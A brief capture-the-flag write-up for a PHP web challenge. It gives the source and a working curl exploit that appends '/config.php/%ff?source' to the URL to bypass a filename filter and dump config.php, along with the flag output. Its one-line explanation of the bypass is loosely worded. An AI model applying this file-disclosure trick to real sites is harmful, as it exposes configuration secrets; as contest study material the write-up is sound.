### Challenge
```
<?php
include 'config.php'; // FLAG is defined in config.php

if (preg_match('/config\.php\/*$/i', $_SERVER['PHP_SELF'])) {
  exit("I don't know what you are thinking, but I won't let you read it :)");
}

if (isset($_GET['source'])) {
  highlight_file(basename($_SERVER['PHP_SELF']));
  exit();
}

$secret = bin2hex(random_bytes(64));
if (isset($_POST['guess'])) {
  $guess = (string) $_POST['guess'];
  if (hash_equals($secret, $guess)) {
    $message = 'Congratulations! The flag is: ' . FLAG;
  } else {
    $message = 'Wrong.';
  }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>Can you guess it?</title>
  </head>
  <body>
    <h1>Can you guess it?</h1>
    <p>If your guess is correct, I'll give you the flag.</p>
    <p><a href="?source">Source</a></p>
    <hr>
<?php if (isset($message)) { ?>
    <p><?= $message ?></p>
<?php } ?>
    <form action="index.php" method="POST">
      <input type="text" name="guess">
      <input type="submit">
    </form>
  </body>
</html>
```

### Solve
* Characters from \x80 to \xff skip next word in regex filtering
```
kali@kali:~$ curl http://3.112.201.75:8003/index.php/config.php/%ff?source
<code><span style="color: #000000">
<span style="color: #0000BB">&lt;?php<br />define</span><span style="color: #007700">(</span><span style="color: #DD0000">'FLAG'</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'zer0pts{gu3ss1ng_r4nd0m_by73s_1s_un1n73nd3d_s0lu710n}'</span><span style="color: #007700">);</span>
</span>
</code>kali@kali:~$ 
```